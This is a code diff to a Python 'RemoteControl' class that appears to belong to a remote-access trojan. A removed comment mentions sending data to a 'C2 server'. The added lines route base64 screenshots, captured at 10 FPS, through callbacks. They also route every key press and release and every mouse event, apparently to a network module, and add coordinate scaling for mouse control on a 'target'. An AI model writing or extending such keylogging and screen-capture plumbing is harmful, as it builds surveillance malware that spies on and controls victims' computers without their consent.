@@ -149,9 +149,9 @@ class RemoteControl:
                     buffer.getvalue()
                 ).decode()
                 
-                # TODO: Send to C2 server
-                # This will be implemented when we connect
-                # it to the network module
+                # Send the screenshot data through our callback
+                if hasattr(self, 'on_screen_capture') and callable(self.on_screen_capture):
+                    self.on_screen_capture(img_str)
                 
                 # Sleep to control frame rate
                 time.sleep(0.1)  # 10 FPS
@@ -195,9 +195,15 @@ class RemoteControl:
             )
                 
             # Convert to base64
-            return base64.b64encode(
+            img_str = base64.b64encode(
                 buffer.getvalue()
             ).decode()
+            
+            # Also send through callback if configured
+            if hasattr(self, 'on_screen_capture') and callable(self.on_screen_capture):
+                self.on_screen_capture(img_str)
+                
+            return img_str
                 
         except Exception as e:
             print(f"Error capturing screenshot: {str(e)}")
@@ -253,11 +259,12 @@ class RemoteControl:
             else:
                 key_str = str(key)
                 
-            # Send event to network module
-            return {
-                'type': 'key_press',
-                'key': key_str
-            }
+            # Send event to network module through callback
+            if hasattr(self, 'on_input_event') and callable(self.on_input_event):
+                self.on_input_event({
+                    'type': 'key_press',
+                    'key': key_str
+                })
             
         except Exception as e:
             print(f"Error handling keyboard press: {str(e)}")
@@ -274,11 +281,12 @@ class RemoteControl:
             else:
                 key_str = str(key)
                 
-            # Send event to network module
-            return {
-                'type': 'key_release',
-                'key': key_str
-            }
+            # Send event to network module through callback
+            if hasattr(self, 'on_input_event') and callable(self.on_input_event):
+                self.on_input_event({
+                    'type': 'key_release',
+                    'key': key_str
+                })
             
         except Exception as e:
             print(f"Error handling keyboard release: {str(e)}")
@@ -289,12 +297,13 @@ class RemoteControl:
             return
             
         try:
-            # Send event to network module
-            return {
-                'type': 'mouse_move',
-                'x': x,
-                'y': y
-            }
+            # Send event to network module through callback
+            if hasattr(self, 'on_input_event') and callable(self.on_input_event):
+                self.on_input_event({
+                    'type': 'mouse_move',
+                    'x': x,
+                    'y': y
+                })
             
         except Exception as e:
             print(f"Error handling mouse move: {str(e)}")
@@ -308,14 +317,15 @@ class RemoteControl:
             # Convert button to string
             button_str = str(button).split('.')[-1]
             
-            # Send event to network module
-            return {
-                'type': 'mouse_click',
-                'x': x,
-                'y': y,
-                'button': button_str,
-                'pressed': pressed
-            }
+            # Send event to network module through callback
+            if hasattr(self, 'on_input_event') and callable(self.on_input_event):
+                self.on_input_event({
+                    'type': 'mouse_click',
+                    'x': x,
+                    'y': y,
+                    'button': button_str,
+                    'pressed': pressed
+                })
             
         except Exception as e:
             print(f"Error handling mouse click: {str(e)}")
@@ -326,14 +336,15 @@ class RemoteControl:
             return
             
         try:
-            # Send event to network module
-            return {
-                'type': 'mouse_scroll',
-                'x': x,
-                'y': y,
-                'dx': dx,
-                'dy': dy
-            }
+            # Send event to network module through callback
+            if hasattr(self, 'on_input_event') and callable(self.on_input_event):
+                self.on_input_event({
+                    'type': 'mouse_scroll',
+                    'x': x,
+                    'y': y,
+                    'dx': dx,
+                    'dy': dy
+                })
             
         except Exception as e:
             print(f"Error handling mouse scroll: {str(e)}")
@@ -347,6 +358,11 @@ class RemoteControl:
     ) -> bool:
         """Execute mouse action on target"""
         try:
+            # Apply inverse scaling if needed to convert from scaled coordinates back to screen coordinates
+            if hasattr(self, 'scale_factor') and self.scale_factor != 1.0:
+                x = int(x / self.scale_factor)
+                y = int(y / self.scale_factor)
+                
             if action == 'move':
                 pyautogui.moveTo(x, y)
             elif action == 'click':
